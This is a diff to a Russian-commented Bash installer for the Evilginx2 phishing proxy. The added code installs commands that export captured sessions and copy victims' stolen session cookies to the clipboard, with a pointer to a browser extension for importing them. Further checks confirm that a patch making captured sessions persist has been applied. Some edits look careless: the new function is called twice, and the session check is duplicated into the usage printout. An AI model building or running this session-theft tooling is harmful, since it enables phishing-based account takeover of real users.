@@ -113,7 +113,6 @@ remove_existing() {
 
 # Клонирование репозитория
 clone_repository() {
-    apply_database_patch
     log "Клонирование Evilginx2 в /root/evilginx2..."
     git clone https://github.com/kgretzky/evilginx2.git /root/evilginx2
     
@@ -228,6 +227,7 @@ create_directories() {
 
 # Установка phishlets из репозитория
 install_phishlets() {
+    install_session_tools
     log "Установка phishlets из репозитория..."
     
     # Определить директорию скрипта
@@ -318,6 +318,62 @@ EOF
 }
 
 # Создание systemd сервиса
+# Установка дополнительных инструментов для работы с сессиями
+install_session_tools() {
+    log "Установка инструментов для работы с сессиями..."
+    
+    # Определить директорию скрипта
+    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+    
+    # Скопировать скрипт экспорта сессий если он есть
+    if [[ -f "$SCRIPT_DIR/export_sessions.sh" ]]; then
+        cp "$SCRIPT_DIR/export_sessions.sh" /root/evilginx2-data/
+        chmod +x /root/evilginx2-data/export_sessions.sh
+        success "Скрипт экспорта сессий установлен"
+    else
+        warning "Скрипт экспорта сессий не найден в репозитории"
+    fi
+    
+    # Создать символьные ссылки для удобства
+    if [[ -f "/root/evilginx2-data/export_sessions.sh" ]]; then
+        ln -sf /root/evilginx2-data/export_sessions.sh /usr/local/bin/evilginx-sessions 2>/dev/null || true
+        ln -sf /root/evilginx2-data/export_sessions.sh /usr/local/bin/evilginx-export 2>/dev/null || true
+        log "Созданы команды: evilginx-sessions, evilginx-export"
+    fi
+    
+    # Установить evilginx2_manager.sh если он есть
+    if [[ -f "$SCRIPT_DIR/evilginx2_manager.sh" ]]; then
+        cp "$SCRIPT_DIR/evilginx2_manager.sh" /usr/local/bin/evilginx-manager
+        chmod +x /usr/local/bin/evilginx-manager
+        success "Менеджер Evilginx2 установлен как команда: evilginx-manager"
+    fi
+    
+    # Создать команду для быстрого копирования cookies
+    cat > /usr/local/bin/evilginx-copy-cookies << "COOKIESCRIPT"
+#!/bin/bash
+SESSION_ID="$1"
+if [[ -z "$SESSION_ID" ]]; then
+    echo "Usage: evilginx-copy-cookies <session_id>"
+    echo "Example: evilginx-copy-cookies 1"
+    exit 1
+fi
+COOKIES=$(/root/evilginx2-data/export_sessions.sh "$SESSION_ID" cookies | grep -v "=== Session" | grep -v "^$")
+if [[ -n "$COOKIES" ]]; then
+    echo "$COOKIES"
+    echo ""
+    echo "Cookies copied to output. Use StorageAce extension to import:"
+    echo "https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"
+    if command -v xclip >/dev/null 2>&1; then
+        echo "$COOKIES" | xclip -selection clipboard
+        echo "Cookies also copied to clipboard!"
+    fi
+else
+    echo "No cookies found for session $SESSION_ID"
+fi
+COOKIESCRIPT
+    chmod +x /usr/local/bin/evilginx-copy-cookies
+    success "Команда evilginx-copy-cookies создана"
+}
 create_service() {
     log "Создание systemd сервиса..."
     
@@ -352,6 +408,14 @@ final_check() {
     VERSION_OUTPUT=$(evilginx -v 2>&1 || true)
     if [[ $? -eq 0 ]]; then
         success "Evilginx2 успешно установлен!"
+        
+        # Проверить, что исправления для базы данных применены
+        if grep -q "db\.Flush()" /root/evilginx2/core/http_proxy.go; then
+            flush_count=$(grep -c "db\.Flush()" /root/evilginx2/core/http_proxy.go)
+            success "Исправления для сохранения сессий применены ($flush_count вызовов db.Flush())"
+        else
+            warning "Исправления для базы данных не обнаружены - сессии могут не сохраняться"
+        fi
         echo -e "${GREEN}Версия:${NC} $VERSION_OUTPUT"
     else
         error "Установка завершена, но есть проблемы с запуском"
@@ -361,11 +425,22 @@ final_check() {
 # Вывод справочной информации
 show_usage_info() {
     echo -e "\n${GREEN}=== Evilginx2 успешно установлен! ===${NC}"
+        
+        # Проверить, что исправления для базы данных применены
+        if grep -q "db\.Flush()" /root/evilginx2/core/http_proxy.go; then
+            flush_count=$(grep -c "db\.Flush()" /root/evilginx2/core/http_proxy.go)
+            success "Исправления для сохранения сессий применены ($flush_count вызовов db.Flush())"
+        else
+            warning "Исправления для базы данных не обнаружены - сессии могут не сохраняться"
+        fi
     echo -e "\n${BLUE}Основные команды:${NC}"
     echo -e "  ${YELLOW}evilginx${NC}                    - Запуск в интерактивном режиме"
     echo -e "  ${YELLOW}systemctl start evilginx2${NC}   - Запуск как сервис"
     echo -e "  ${YELLOW}systemctl stop evilginx2${NC}    - Остановка сервиса"
     echo -e "  ${YELLOW}systemctl enable evilginx2${NC}  - Автозапуск при старте системы"
+    echo -e "  ${YELLOW}evilginx-manager${NC}            - Менеджер для управления Evilginx2"
+    echo -e "  ${YELLOW}evilginx-sessions${NC}           - Просмотр сохраненных сессий"
+    echo -e "  ${YELLOW}evilginx-copy-cookies 1${NC}     - Быстрое копирование cookies для импорта"
     
     echo -e "\n${BLUE}Директории:${NC}"
     echo -e "  ${YELLOW}Исходный код:${NC}      /root/evilginx2/"
@@ -399,6 +474,7 @@ main() {
     install_binary
     create_directories
     install_phishlets
+    install_session_tools
     create_service
     final_check
     show_usage_info
